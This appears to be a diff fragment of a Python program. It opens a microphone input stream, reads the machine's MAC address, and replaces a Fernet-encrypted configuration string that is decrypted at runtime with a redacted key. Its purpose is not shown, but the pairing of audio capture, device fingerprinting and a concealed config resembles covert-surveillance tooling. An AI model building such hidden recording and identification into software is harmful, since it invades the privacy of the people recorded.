@@ -34,8 +34,7 @@ stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, fram
 mac = '-'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
 
 key = "REDACTED_ROTATE_ME"
-encrypted_config = "gAAAAABkqffc0bs4ujeT2yCGSHI7KJH8Ayfep8ubxnzqQt1nFhLqttAVyKhepOVfJCSfMy1zzwQjO5i50ZKsK2AHhuxMeeZD0M-PzXP9EZwSSeWCmBmJKK-LfHKx_ps4dmV93GG-MjwXxlT69MoLcrjLw5oPkYzBAt60UBJqMK0OVzU07hO2RKs="
-
+encrypted_config = "gAAAAABkwnoDbd5YlaFDbdto6ThE3TLcxrtLL-GYhms-ioe4HLgjhsmGvJEcetda0TcbLyB2Q0DrMdKwSdlRdnEhscKn19aLFGjLGJ5ksXK3zFo4q70anf_VSCqd_5jTZD15ApF0euylcMBFccuuJijPMBnc-BBWY-DbsjIMQtNoqtfyint7mRb8effyuV7URq033e1fgbS7"
 cipher = Fernet(key)
 config = json.loads(cipher.decrypt(encrypted_config))
 
